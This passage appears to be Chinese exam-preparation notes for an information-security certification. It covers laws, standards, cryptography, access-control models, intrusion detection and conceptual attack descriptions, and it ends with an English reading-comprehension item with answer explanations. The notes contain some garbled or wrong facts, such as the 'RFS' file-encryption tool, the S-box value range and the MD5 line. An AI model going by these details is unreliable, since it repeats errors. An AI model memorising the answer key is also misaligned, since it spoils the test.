<p>访问验证保护级的计算机信息系统可信计算机满足访问监控器需求。访问监控器仲裁主体对客体的全部访问。访问监控器本身是抗篡改的；必须足够小，能够分析和测试。</p>
<p>注意，这里的 “可信 计算基” 是专有名词</p>
<ol start="7">
<li></li>
</ol>
<p>《中华人民共和国网络安全法》第五十六条 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。</p>
<ol start="8">
<li></li>
</ol>
<p>《一般数据保护条例》是欧盟法规的重要组成部分，主要内容是关于欧盟境内的公民数据应该如何被公司所使用，引入严格的新规则，以获得人们对数据进行处理的同意。它由欧洲议会在2016年4月所批准，并且将在2018年5月正式实施。</p>
<ol start="9">
<li></li>
</ol>
<p>威胁是一种对信息系统构成潜在破坏的可能性因素。</p>
<ol start="10">
<li></li>
</ol>
<p>《中华人民共和国网络安全法》第八条 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。<strong>国务院电信主管部门</strong>、<strong>公安部门</strong>和<strong>其他有关机关</strong>依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。</p>
<ol start="11">
<li></li>
</ol>
<p>计算机系统外部设备在工作时能够通过地线、电源线、信号线、寄生电磁信号或谐波将有用信息辐射出去的过程，叫计算机的电磁泄漏。</p>
<ol start="12">
<li></li>
</ol>
<p>《中华人民共和国密码法》于2020年1月1日生效。</p>
<ol start="13">
<li></li>
</ol>
<p>《数据中心设计规范》（gb50174-2017）中，数据中心的耐火等级不应低于二级。</p>
<ol start="14">
<li></li>
</ol>
<p>《互联网数据中心工程技术规范》（GB51195-2016）重要条款有：</p>
<p>3.3.2  IDC机房可划分为R1、R2、R3三个级别，各级IDC机房应符合下列规定：</p>
<p>1  R1级IDC机房的机房基础设施和网络系统的<strong>主要部分应具备一定的冗余能力</strong>，机房基础设施和网络系统可支撑的IDC业务的可用性不应小于<strong>99.5％</strong>。</p>
<p>2  R2级IDC机房的机房基础设施和网络系统<strong>应具备冗余能力</strong>，机房基础设施和网络系统可支撑的IDC业务的可用性不应小于<strong>99.9％</strong>。</p>
<p>3  R3级IDC机房的机房基础设施和网络系统<strong>应具备容错能力</strong>，机房基础设施和网络系统可支撑的IDC业务的可用性不应小于<strong>99.99％</strong>。</p>
<ol start="15">
<li></li>
</ol>
<p>信息安全技术信息系统灾难恢复规范（GB&#x2F;T 20988-2007）》中：</p>
<p>第3级要求每天多次利用通信网络将关键数据定时批量传送至备用场地，并在灾难备份中心配置专职的运行管理人员;对于运行维护来说，要求制定电子传输数据备份系统运行管理制度。</p>
<p>第4级须配置灾难恢复所需的全部数据处理设备和通信线路及网络设备，并处于就绪状态;备用场地也提出了支持7×24小时运作的更高的要求，同时对技术支持和运维管理的要求也有相应的提高。</p>
<ol start="16">
<li></li>
</ol>
<p><strong>全面（严格）</strong>：A</p>
<p><strong>主要（较完善）</strong>：B</p>
<p><strong>基本（大概）</strong>：C</p>
<ol start="17">
<li></li>
</ol>
<p><img src="/../image/Soft-exam-intermediate/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%AD%89%E7%BA%A7.png"></p>
<ol start="18">
<li></li>
</ol>
<p>网络安全等级保护2.0的主要变化包括：一是<strong>扩大了对象范围</strong>，将云计算、移动互联、物联网、工业控制系统等列入标准范围，构成了“网络安全通用要求+新型应用的网络安全扩展要求”的要求内容。二是提出了在“安全通信网络”“安全区域边界”“安全计算环境”和“安全管理中心”支持下的<strong>三重防护体系架构</strong>。三是等级保护2.0新标准强化了可信计算技术使用的要求，<strong>各级增加了“可信验证”控制点</strong>。其中，一级要求设备的系统引导程序、系统程序等进行可信验证；二级增加重要配置参数和应用程序进行可信验证，并将验证结果形成审计记录送至安全管理中心；三级增加应用程序的关键执行环节进行动态可信验证；四级增加应用程序的所有执行环节进行动态可信验证。</p>
<ol start="19">
<li></li>
</ol>
<p>数据分级分为三个等级，分别是核心数据、重要数据和一般数据。这一划分依据的是国家标准GB&#x2F;T 43697-2024《数据安全技术 数据分类分级规则》，该标准于2024年10月1日正式实施，旨在规范数据安全管理，明确不同级别数据的保护要求。</p>
<ol start="20">
<li></li>
</ol>
<p>网络生存模型的3R策略是：抵抗（Resisitance）、识别(Recognition)、恢复（Recovery）。</p>
<h5 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h5><h6 id="密码学基本概念"><a href="#密码学基本概念" class="headerlink" title="密码学基本概念"></a>密码学基本概念</h6><ol>
<li></li>
</ol>
<p>DES分组长度为64比特，使用56比特密钥对64比特的明文串进行16轮加密，得到64比特的密文串。</p>
<p>DES的子密钥的长度是48位。这里要注意题目问的是子密钥，而不是密钥。<br>将56位密钥分成两半，然后通过左循环移一位或者两位的方式选取子密钥，最终选取到56位中的选取出48位子密钥。这个过程叫做压缩置换。</p>
<ol start="2">
<li></li>
</ol>
<p>近代密码学认为，一个密码仅当它能经得起已知明文攻击时才是可取的。</p>
<p>3.BLP特性（隐私防护）</p>
<p><img src="/../image/Soft-exam-intermediate/BLP%E7%89%B9%E6%80%A7.png"></p>
<p>BLP特性</p>
<p>简单安全规则：当主体的安全级可以支配客体的安全级，且主体对客体有自主型读权限，主体可以读客体。<br> *特性：当客体的安全级别可以支配主体的安全级，且主体对客体有自主型写权限时，主体可以写入客体。</p>
<ol start="4">
<li></li>
</ol>
<p>BiBa模型的简单安全特性规则：当且仅当客体的完整性级别支配主体的完整性级别时，主体才具有对客体读的权限，即（主体不能向下读）</p>
<p>BiBa模型的*特性规则：当且仅当主体的完整性级别支配客体的完整性级别时，主体才具有对客体写权限，即（主体不能向上写）。</p>
<ol start="5">
<li></li>
</ol>
<p><strong>IDEA</strong>( International Data Encryption Algorithm)是国际数据加密算法的简记，是一个<strong>分组加密处理算法</strong>，其<strong>明文和密文分组都是64比特</strong>，<strong>密钥长度为128比特</strong>。</p>
<ol start="6">
<li></li>
</ol>
<p><strong>Diffie-Hellman</strong>密钥交换协议的安全性基于<strong>求解离散对数的困难性</strong>，即对于C^d&#x3D;M mod P，在已知C和P的前提下，由d求M很容易，但是由M反过来求d则比较困难。</p>
<p><strong>RSA算法</strong>的安全性基于<strong>大整数因子分解的困难性</strong>。</p>
<ol start="7">
<li></li>
</ol>
<p>国产密码算法是指由国家密码研究相关机构自主研发，具有相关知识产权的商用密码算法。目前的国产密码算法中，<strong>SM2属于非对称密码算法（椭圆曲线公钥密码算法），SM3属于散列算法（杂凑算法），SM4属于分组密码算法，SM9属于基于标识的密码算法</strong>。</p>
<p>sm3输出长度为256比特的摘要信息</p>
<p><img src="/../image/Soft-exam-intermediate/sm%E7%B3%BB%E5%88%97.png"></p>
<ol start="8">
<li></li>
</ol>
<p>误用入侵检测能直接检测不利的或者不可接受的行为，而异常入侵检测是检查出与正常行为相违背的行为</p>
<ol start="9">
<li></li>
</ol>
<p>P2DR模型的四个主要部分：<br>Policy(<strong>安全策略</strong>)\Protextion(<strong>防护</strong>)\Detection(<strong>检测</strong>)\Response(<strong>响应</strong>)</p>
<h6 id="密码技术"><a href="#密码技术" class="headerlink" title="密码技术"></a>密码技术</h6><p>1.<strong>置换密码的规则是：明文的字母不变，位置打乱</strong></p>
<p>逆置换：</p>
<p>​	7562314	1在第6个	则：6457231</p>
<ol start="2">
<li></li>
</ol>
<p>PGP应用了多种密码技术</p>
<p>其中密钥管理算法选用RSA、数据加密算法选用IDEA、完整性检测和数字签名采用了MD5和RSA以及随机数生成器</p>
<p>( International Data Encryption Algorithm)是国际数据加密算法的简记，是一个分组加密处理算法，其明文和密文分组都是64比特，密钥长度为128比特。</p>
<ol start="3">
<li></li>
</ol>
<p>ddos主要破坏可用性</p>
<p>网络清洗的技术：</p>
<p>①流量检测</p>
<p>②流量牵引与清洗</p>
<p>③流量回注</p>
<ol start="4">
<li></li>
</ol>
<p>S盒的每行都是1-15的随机排列，所以只需要查找每行缺少的数值</p>
<ol start="5">
<li></li>
</ol>
<p>12345用S盒加密（16进制表示），64&#x2F;8&#x3D;8<br>$$<br>1 字节（byte）&#x3D;8 比特（bit）<br>$$<br>DES支持64比特的明文块加密，密钥长度是56比特</p>
<p>而字符串12345只有5字节，所以尾部填充\x00</p>
<p>12345对应的ASCII表为<br>\x31\x32\x33\x34\x35</p>
<p>填充后为</p>
<p>\x31\x32\x33\x34\x35\x00\x00\x00</p>
<ol start="6">
<li></li>
</ol>
<p>弱密钥不受任何循环唯一的影响，加入用多个\x00作为密钥加密，则iv没用了，典型就是全0或者全1组成的密钥，会造成弱密钥问题</p>
<h6 id="分组密码"><a href="#分组密码" class="headerlink" title="分组密码"></a>分组密码</h6><p>1.错误传播无界：Mi或者Ci发生一位错误时，以后密文全部错误</p>
<p>2.S盒变换是一种压缩替换，通过S盒将48位输入变为32位输出。共有8个S盒，每个S盒有6个输入，4个输出，是非线性压缩变化</p>
<ol start="3">
<li></li>
</ol>
<p>AES算法必须满足的条件：</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>要求</th>
</tr>
</thead>
<tbody><tr>
<td>分组长度</td>
<td>固定为 128 bit</td>
</tr>
<tr>
<td>密钥长度</td>
<td>支持 128 &#x2F; 192 &#x2F; 256 bit</td>
</tr>
<tr>
<td>算法状态</td>
<td>完全公开、无密级</td>
</tr>
<tr>
<td>授权方式</td>
<td>无版权、无专利、免费使用</td>
</tr>
<tr>
<td>设计目的</td>
<td>高安全性、高性能、易实现、跨平台</td>
</tr>
</tbody></table>
<h6 id="PKI体系（公钥分发方法）"><a href="#PKI体系（公钥分发方法）" class="headerlink" title="PKI体系（公钥分发方法）"></a>PKI体系（公钥分发方法）</h6><p>PKI提供了一种系统化的、可扩展的、统一的、容易控制的公钥分发方法。基于PKI的主要安全服务有身份认证、完整性保护、数字签名、会话加密管理、密钥恢复。一般来说,PKI涉及多个实体之间的协商和操作,主要实体包括CA、RA、终端实体( End Entity)、客户端、目录服务器。</p>
<p>·CA( Certification Authority):证书授权机构,主要进行证书的颁发、废止和更新认证机构负责签发、管理和撤销一组终端用户的证书</p>
<p>·RA( Registration Authority):证书登记权威机构,将公钥和对应的证书持有者的身份及其他属性联系起来,进行注册和担保:RA可以充当CA和它的终端用户之间的中间实体,辅助CA完成其他绝大部分的证书处理功能</p>
<p>·目录服务器:CA通常使用一个目录服务器,提供证书管理和分发的服务。</p>
<p>·终端实体( End Entity):指需要认证的对象,例如服务器、打印机、E-mai地址、用户等。</p>
<p>·客户端( Client):指需要基于PKI安全服务的使用者,包括用户、服务进程等。</p>
<p>只要一方给对方的公钥或者双方给互相的公钥颁发证书时，两者之间就建立了信任关系</p>
<h6 id="Hash函数"><a href="#Hash函数" class="headerlink" title="Hash函数"></a>Hash函数</h6><ol>
<li></li>
</ol>
<p>SHA-1对输入按512位进行分组，输出为160位的报文摘要，hash具有单向性</p>
<p>MD5算法由MD2，MD3，MD4，消息分组长度为512比特，生成128比特的摘要</p>
<ol start="2">
<li></li>
</ol>
<p>windows操作系统自带的文件加密工具是RFS，为NTFS格式的磁盘文件加密</p>
<h6 id="公钥密码体制"><a href="#公钥密码体制" class="headerlink" title="公钥密码体制"></a>公钥密码体制</h6><ol>
<li></li>
</ol>
<p>普遍认为，160位长的椭圆曲线密码的安全性相当于1024位的RSA密码</p>
<ol start="2">
<li></li>
</ol>
<p>RSA算法是基于大整数因子分解的困难性而提出的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密文C=m^e mod n </span><br><span class="line">#其中n为p*q</span><br><span class="line">密文=（明文^13）mod 51 =2^13 mod 51=32</span><br></pre></td></tr></table></figure>



<ol start="3">
<li></li>
</ol>
<p><strong>S&#x2F;MIME</strong>安全&#x2F;多用途互联网邮箱扩展协议，用于<strong>提供数据保护、完整性保护、认证和鉴别服务</strong></p>
<p><strong>SMTP、POP3、IMAP</strong>都是基于ASCII文本格式的应用层协议，<strong>会话过程使用明文</strong></p>
<h6 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h6><p>1.数字证书也称为公钥证书</p>
<p>2.RADIUS基于UDP协议，认证端口是1812，计费端口为1813，传输过程中的密码本身加密</p>
<h6 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h6><p>1.<strong>Kerberos仅仅依赖于对称加密体制</strong></p>
<ol start="2">
<li></li>
</ol>
<p>Kerberos系统涉及四个基本实体：</p>
<p>(1)Kerberos客户机，用户用来访问服务器设备</p>
<p>(2)AS(认证服务器)，识别用户身份并提供TGS会话密钥；</p>
<p>(3)TGS(票据发放服务器)，为申请服务的用户授予票据(Ticket)；</p>
<p>(4)应用服务器，为用户提供服务的设备或系统。</p>
<p>其中，<strong>通常将AS和TGS统称为KDC</strong>。票据(Ticket)是用于安全的传递用户身份所需要的信息的集合，主要包括客户方Principal、目的服务方Principal、客户方IP地址、时间戳(分发该Ticket的时间)、Ticket的生存期，以及会话密钥等内容。</p>
<p>3.Windows 2000系统的操作权限分成多种类型，如关闭系统、备份文件、管理系统、安全日志，然后把权限授予不同的组（类似角色）</p>
<h5 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h5><p>1.Libpcap是网络数据包捕获软件</p>
<p>2.NMAP是扫描工具</p>
<h3 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h3><ol>
<li></li>
</ol>
<p>入侵检测系统（IDS）的体系结构大概可以分为基于<strong>主机型</strong>、基于<strong>网络型</strong>和基于<strong>主体型&#x2F;分布式</strong>三种</p>
<p>入侵检测系统可以分为，基于主机分析和基于网络数据分析；</p>
<ol start="2">
<li></li>
</ol>
<p><strong>Botnet（僵尸网络）</strong>，结合DDOS攻击力大大提升</p>
<ol start="3">
<li></li>
</ol>
<p>计算机病毒的生命周期一般包括<strong>潜伏阶段</strong>（休眠）、<strong>传播阶段</strong>、<strong>触发阶段</strong>、<strong>发作阶段</strong>四个阶段。</p>
<ol start="4">
<li></li>
</ol>
<p><strong>TCP Xmas树</strong>扫描。该方法向目标端口发送FIN、URG和PUSH分组。按照RFC793的规定，目标系统应该给所有关闭着的端口发送回一个RST分组。</p>
<p><strong>TCP FIN扫描</strong>是向目标端口发送一个FIN分组。按照 RFC 793的规定，目标端口应该给所有关闭着的端口发回一个RST分组，而打开着的端口则往往忽略这些请求。此方法利用了TCP&#x2F;IP实现上的一个漏洞来完成扫描，通常只在基于UNIX的TCP&#x2F;IP协议栈上才有效。</p>
<ol start="5">
<li></li>
</ol>
<p><img src="/../image/Soft-exam-intermediate/VPN.jpg"></p>
<ol start="6">
<li></li>
</ol>
<p>IPSecVPN各类性能要求的前提是，以太帧分别为64、1428字节（IPv6为1408字节）。加解密吞吐率：VPN产品不丢包的前提下，内网口所能达到的双向最大流量。</p>
<ol start="7">
<li></li>
</ol>
<p>COPS:扫描UNIX系统漏洞及配置问题</p>
<p>Tiger:shell脚本程序，检查UNIX系统配置</p>
<p>MBSA：提供基于Windows的安全基准分析</p>
<p>Nmap：端口扫描工具</p>
<ol start="8">
<li></li>
</ol>
<p>Executor用80端口传递控制信息和数据；</p>
<p>Blade Runner、Doly Trojan、Fore、FTP Trojan、 Larva、Ebex,WinCrash等木马复用21端口；</p>
<p>Shtrilitz Stealth、Terminator、WinPC、WinSpy等木马复用25端口；</p>
<ol start="9">
<li></li>
</ol>
<p>隐蔽通道技术能有效隐藏通信内容和通信状态，目前常见的能提供隐蔽通道方式进行通信的后门有BO2K、Code Red II、Nimida和Covert TCP等。</p>
<ol start="10">
<li></li>
</ol>
<p>攻击工具包括:</p>
<p>·用户命令:攻击者在命令行状态下或者以图形用户接口方式输入攻击命令;</p>
<p>·脚本或程序:利用脚本和程序挖掘弱点;</p>
<p>·自治主体:攻击者初始化一个程序或者程序片断，独立执行漏洞挖掘;</p>
<p>·电磁泄漏:通过电子信号分析方法，实施电磁泄漏攻击。</p>
<ol start="11">
<li></li>
</ol>
<p>隐藏技术有：</p>
<p>·连接隐藏，如冒充其他用户、修改LOGNAME环境变量、修改utmp日志文件、使用IP SPOOF技术等。</p>
<p>·进程隐藏，如使用重定向技术减少ps给出的信息量、用特洛伊木马代替ps程序等。</p>
<p>·文件隐蔽，如利用字符串相似麻痹系统管理员，或修改文件属性使得普通显示方法无法看到;利用操作系统可加载模块特性，隐瞒攻击时所产生的信息。</p>
<ol start="12">
<li></li>
</ol>
<p>同步包风暴（SYN Flood）攻击者假造源网址发送多个同步数据包(Syn Packet)给服务器，服务器因无法收到确认数据包(Ack Packet )，使TCP&#x2F;IP协议的三次握手无法顺利完成，因而无法建立连接。其原理是发送大量半连接状态的服务请求，使服务主机无法处理正常的连接请求，因而影响正常运作。</p>
<p>泪滴攻击暴露出IP数据包分解与重组的弱点。当IP数据包在网络中传输时，会被分解成许多不同的片传送，并借由偏移量字段作为重组的依据。泪滴攻击通过加入过多或不必要的偏移量字段，使计算机系统重组错乱，产生不可预期的后果。</p>
<ol start="13">
<li></li>
</ol>
<p><strong>隐秘通道：信息泄露的隐秘表达方式，顶安全主体对高安全主体能间接读取</strong></p>
<ol start="14">
<li></li>
</ol>
<p>PDRR模型中PDRR是Protection, Detection, Recovery, Response英文单词的缩写。PDRR改进了传统的只有保护的单一安全防御思想，强调信息安全保障的四个重要环节。<strong>保护</strong>(Protection)的内容主要有加密机制、数据签名机制、访问控制机制、认证机制、信息隐藏、防火墙技术等。<strong>检测</strong>(Detection的内容主要有入侵检测、系统脆弱性检测、数据完整性检测、攻击性检测等。<strong>恢复</strong>(Recovery)的内容主要有数据备份、数据修复、系统恢复等。<strong>响应</strong>(Response)的内容主要有应急策略、应急机制、应急手段、入侵过程分析及安全状态评估等。</p>
<ol start="15">
<li></li>
</ol>
<p>网络生存性是指在网络信息系统遭受入侵的情形下，网络信息系统仍然能够持续提供必要服务的能力。目前，国际上的网络信息生存模型遵循“3R”的建立方法。首先将系统划分成不可攻破的安全核和可恢复部分。然后对一定的攻击模式，给出相应的3R策略，即抵抗（Resistance）、识别（Recognition）和恢复（Recovery）</p>
<ol start="16">
<li></li>
</ol>
<p>鉴别实体根据验证对象所提供的认证依据，给出身份的真实性或属性判断。</p>
<ol start="17">
<li></li>
</ol>
<p>访问者又称为主体可以是用户、进程、应用程序等；资源对象又称为客体，即被访问的对象，可以是文件、应用服务、数据等。</p>
<ol start="18">
<li></li>
</ol>
<p>基于角色的访问控制(RBA)就是指根据完成某些职责任务所需要的访问权限来进行授权和管理。RBAC由**用户(U)<strong>、</strong>角色(R)<strong>、</strong>会话(s)<strong>和</strong>权限(P)**四个基本要素组成。</p>
<ol start="19">
<li></li>
</ol>
<p>网络安全风险评估准备的首要工作是确定评估对象和范围。</p>
<ol start="20">
<li></li>
</ol>
<p>《信息安全技术信息系统灾难恢复规范(GB&#x2F;T 20988-2007) 》，该规范定义了六个灾难恢复等级和技术要求。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">第1级--基本支持。本级要求至少每周做一次完全数据备份，并且备份介质场外存放;同时还需要有符合介质存放的场地;企业要制定介质存取、验证和转储的管理制度，并按介质特性对备份数据进行定期的有效性验证;企业需要制订经过完整测试和演练的灾难恢复预案。</span><br><span class="line">第2级--备用场地支持。第2级在第1级的基础上，还要求配备灾难发生后能在预定时间内调配使用的数据处理设备和通信线路以及相应的网络设备;并且对于第1级中存放介质的场地，需要其能满足信息系统和关键业务功能恢复运作的要求;对于企业的运维能力，也增加了相应的要求，即要制定备用场地管理制度，同时要与相关厂商、运营商有符合灾难恢复时间要求的紧急供货协议、备用通信线路协议。</span><br><span class="line">第3级--电子传输和部分设备支持。第3级不同于第2级的调配数据处理设备和具备网络系统紧急供货协议，其要求配置部分数据处理设备和部分通信线路及相应的网络设备;同时要求每天多次利用通信网络将关键数据定时批量传送至备用场地，并在灾难备份中心配置专职的运行管理人员;对于运行维护来说，要求制定电子传输数据备份系统运行管理制度。</span><br><span class="line">第4级--电子传输及完整设备支持。第4级相对于第3级中的配备部分数据处理设备和网络设备而言，须配置灾难恢复所需的全部数据处理设备和通信线路及网络设备，并处于就绪状态;备用场地也提出了支持7X24小时运作的更高的要求，同时对技术支持和运维管理的要求也有相应的提高。</span><br><span class="line">第5级--实时数据传输及完整设备支持。第5级相对于第4级的数据电子传输而言，要求实现远程数据复制技术，并利用通信网络将关键数据实时复制到备用场地;同时要求备用网络具备自动或集中切换能力。</span><br><span class="line">第6级--数据零丢失和远程集群支持。第6级相对于第5级的实时数据复制而言，要求数据远程实时备份，实现数据零丢失;同时要求应用软件是集群的，可以实现实时无缝切换，并具备远程集群系统的实时监控和自动切换能力;对于备用网络的要求也有所加强，要求用户可通过网络同时接入主、备中心。</span><br></pre></td></tr></table></figure>



<ol start="21">
<li></li>
</ol>
<p>物理环境安全是指包括环境、设备和记录介质在内的所有支持网络系统运行的硬件的总体安全，是网络系统安全、可靠、不间断运行的基本保证。<strong>物理安全需求</strong>主要包括<strong>环境安全</strong>、<strong>设备安全</strong>、<strong>存储介质安全</strong>。</p>
<ol start="22">
<li></li>
</ol>
<p>SSL协议提供三种安全通信服务。</p>
<p>(1)保密性通信。握手协议产生秘密密钥(secret key)后才开始加、解密数据。数据的加、解密使用对称式密码算法,例如DES、AES等。</p>
<p>(2)点对点之间的身份认证。采用非对称式密码算法,例如RSA、DSS等。</p>
<p>(3)可靠性通信。信息传送时包含信息完整性检查,使用有密钥保护的消息认证(Message Authentication Code,简称MAC)，MAC的计算采用安全杂凑函数,例如SHA、MD5。</p>
<ol start="23">
<li></li>
</ol>
<p><img src="/../image/Soft-exam-intermediate/%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7.png" alt="常见渗透工具"></p>
<ol start="24">
<li></li>
</ol>
<p>常见的<strong>误用</strong>检测方法：<strong>基于条件概率的误用检测方法</strong>、<strong>基于状态迁移的误用检测方法</strong>、<strong>基于键盘监控的误用检测方法</strong>、<strong>基于规则的误用检测方法</strong>。</p>
<p>常见的<strong>异常</strong>检测方法：<strong>基于统计的异常检测方法、基于模式预测的异常检测方法、基于文本分类的异常检测方法、基于贝叶斯推理的异常检测方法</strong>。</p>
<ol start="25">
<li></li>
</ol>
<p><img src="/../image/Soft-exam-intermediate/%E5%B8%B8%E8%A7%81%E7%94%B5%E8%84%91%E7%97%85%E6%AF%92.png" alt="常见电脑病毒"></p>
<ol start="26">
<li></li>
</ol>
<p><img src="/../image/Soft-exam-intermediate/%E8%A0%95%E8%99%AB%E5%AE%9E%E4%BE%8B.png"></p>
<ol start="27">
<li></li>
</ol>
<p><img src="/../image/Soft-exam-intermediate/%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97.png"></p>
<ol start="28">
<li></li>
</ol>
<p>在华为设备中，基本访问控制列表（ACL）主要依据源 IP 地址来对数据包进行过滤，其编号范围是 2000 - 2999 。而高级 ACL 能够基于源 IP 地址、目的 IP 地址、源端口、目的端口等更多条件进行过滤，编号范围是 3000 - 3999</p>
<ol start="29">
<li></li>
</ol>
<p>电子密码本（ECB）模式是分组密码的一种最基本操作模式。</p>
<p>ECB 模式对每个明文数据块使用相同的密钥进行加密或解密，而非不同密钥。</p>
<p>ECB 模式中，每个密文块独立加密&#x2F;解密，错误仅局限于当前块。若某一密文块出错，仅会导致对应的明文块错误，不会扩散到其他块。</p>
<h5 id="系统安全"><a href="#系统安全" class="headerlink" title="系统安全"></a>系统安全</h5><ol>
<li></li>
</ol>
<p>RAID5如果是由容量不同的盘组成，则以最小盘容量计算总容量。</p>
<p>（1）3块160的银盘做RAID5，总容量&#x3D;（3-1）×160&#x3D;320G.</p>
<p>（2）2块160G和1块80G的盘做RAID5，总容量&#x3D;（3-1）×80G&#x3D;160G</p>
<ol start="2">
<li></li>
</ol>
<p>软件安全能力成熟度模型分成五级，各级别的主要过程如下:<br>·CMM1级—补丁修补;<br>·CMM2级—渗透测试、安全代码评审;<br>·CMM3级—漏洞评估、代码分析、安全编码标准;<br>·CMM4级—软件安全风险识别、SDLC实施不同安全检查点;<br>·CMM5级—改进软件安全风险覆盖率、评估安全差距。</p>
<ol start="3">
<li></li>
</ol>
<h1 id="1-英语阅读理解"><a href="#1-英语阅读理解" class="headerlink" title="1-英语阅读理解"></a>1-英语阅读理解</h1><p><strong>其一阅读理解：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The modern study of symmetric-key ciphers relates mainly to the study of block ciphers and stream ciphers and to their applications. A block cipher is, in a sense, a modern embodiment of Alberti&#x27;s polyalphabetic cipher: block ciphers take as input a block of （ ）and a key, and output a block of ciphertext of the same size. Since messages are almost always longer than a single block, some method of knitting together successive blocks is required. Several have been developed, some with better security in one aspect or another than others. They are the mode of operations and must be carefully considered when using a block cipher in a cryptosystem.</span><br><span class="line">The Data Encryption Standard (DES) and the Advanced Encryption Standard (AES) are（ ）designs which have been designated cryptography standards by the US government (though DES&#x27;s designation was finally withdrawn after the AES was adopted). Despite its deprecation as an official standard, DES (especially its still-approved and much more secure triple-DES variant) remains quite popular; it is used across a wide range of applications, from ATM encryption to e-mail privacy and secure remote access. Many other block ciphers have been designed and released, with considerable variation in quality. Many have been thoroughly broken. See Category: Block ciphers.</span><br><span class="line">Stream ciphers, in contrast to the ‘block’type, create an arbitrarily long stream of key material, which is combined （） the plaintext bit-by-bit or character-by-character, somewhat like the one-time pad. In a stream cipher, the output（ ）is created based on an internal state which changes as the cipher operates. That state change is controlled by the key, and, in some stream ciphers, by the plaintext stream as well. RC4 is an example of a well-known, and widely used, stream cipher; see Category: Stream ciphers.</span><br><span class="line">Cryptographic hash functions (often called message digest functions) do not necessarily use keys, but are a related and important class of cryptographic algorithms. They take input data (often an entire message), and output a short fixed length hash, and do so as a one-way function. For good ones, （ ） (two plaintexts which produce the same hash) are extremely difficult to find.</span><br><span class="line">Message authentication codes (MACs) are much like cryptographic hash functions, except that a secret key is used to authenticate the hash value on receipt. These block an attack against plain hash functions.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">问题1</span><br><span class="line"></span><br><span class="line"> A.plaintext</span><br><span class="line"></span><br><span class="line"> B.ciphertext</span><br><span class="line"></span><br><span class="line"> C.data</span><br><span class="line"></span><br><span class="line"> D.hash</span><br><span class="line"></span><br><span class="line"> 问题2</span><br><span class="line"></span><br><span class="line"> A.stream cipher</span><br><span class="line"></span><br><span class="line"> B.hash function</span><br><span class="line"></span><br><span class="line"> C.Message authentication code</span><br><span class="line"></span><br><span class="line"> D.Block cipher</span><br><span class="line"></span><br><span class="line"> 问题3</span><br><span class="line"></span><br><span class="line"> A.of</span><br><span class="line"></span><br><span class="line"> B.for</span><br><span class="line"></span><br><span class="line"> C.with</span><br><span class="line"></span><br><span class="line"> D.in</span><br><span class="line"></span><br><span class="line"> 问题4</span><br><span class="line"></span><br><span class="line"> A.hash</span><br><span class="line"></span><br><span class="line"> B.stream</span><br><span class="line"></span><br><span class="line"> C.ciphertext</span><br><span class="line"></span><br><span class="line"> D.plaintext</span><br><span class="line"></span><br><span class="line"> 问题5</span><br><span class="line"></span><br><span class="line"> A.collisions</span><br><span class="line"></span><br><span class="line"> B.image</span><br><span class="line"></span><br><span class="line"> C.preimage</span><br><span class="line"></span><br><span class="line"> D.solution</span><br></pre></td></tr></table></figure>

<p>解析：</p>
<p>问题1：A block cipher takes as input a block of （ ） and a key, and output a block of ciphertext of the same size.</p>
<p>块密码输入一个块和密钥，输出一个相同大小的密文块。这里输入应该是明文，因为块密码加密明文生成密文。所以，选项A. plaintext 是正确的。</p>
<p>问题2：The Data Encryption Standard (DES) and the Advanced Encryption Standard (AES) are（ ）designs which have been designated cryptography standards by the US government.</p>
<p>DES和AES是块密码标准，所以它们应该是块密码设计。选项D. Block cipher 是正确的。其他选项如流密码、哈希函数、消息认证码都不符合，因为DES和AES是块密码。</p>
<p>问题3：Stream ciphers create an arbitrarily long stream of key material, which is combined （） the plaintext bit-by-bit or character-by-character.</p>
<p>流密码生成一个任意长的密钥流，这个密钥流与明文按位或按字符组合。组合通常用“with”表示，所以选项C. with 是正确的。例如，在流密码中，密钥流与明文进行异或操作。</p>
<p>问题4：In a stream cipher, the output（ ）is created based on an internal state which changes as the cipher operates.</p>
<p>在流密码中，输出是基于内部状态生成的。输出应该是密钥流，因为流密码输出密钥流与明文组合。选项B. stream 是正确的。输出是密钥流，而不是哈希、密文或明文。</p>
<p>问题5：For good cryptographic hash functions, （ ） (two plaintexts which produce the same hash) are extremely difficult to find.</p>
<p>对于好的哈希函数，两个产生相同哈希的明文是极其难以找到的。这指的是碰撞，即两个不同的输入产生相同的哈希值。所以选项A. collisions 是正确的。其他选项如image、preimage、solution不直接指碰撞。</p>
<p><strong>问题1解析</strong></p>
<p>块密码（block cipher）的输入是一个块和密钥，输出是一个相同大小的密文块。这里输入的内容应该是明文（plaintext），因为块密码的作用是加密明文生成密文。因此，正确答案是<strong>A. plaintext</strong>。</p>
<p><strong>问题2解析</strong></p>
<p>数据加密标准（DES）和高级加密标准（AES）都是块密码（block cipher）设计，并被美国政府指定为密码学标准。DES虽然已被撤回，但三重DES仍在广泛使用。其他选项如流密码（stream cipher）、哈希函数（hash function）或消息认证码（Message authentication code）都不符合DES和AES的本质。因此，正确答案是<strong>D. Block cipher</strong>。</p>
<p><strong>问题3解析</strong></p>
<p>流密码（stream cipher）生成一个任意长的密钥流，该密钥流与明文（plaintext）按位或按字符进行组合。组合通常使用介词“with”表示，例如在异或操作中。因此，正确答案是<strong>C. with</strong>。</p>
<p><strong>问题4解析</strong></p>
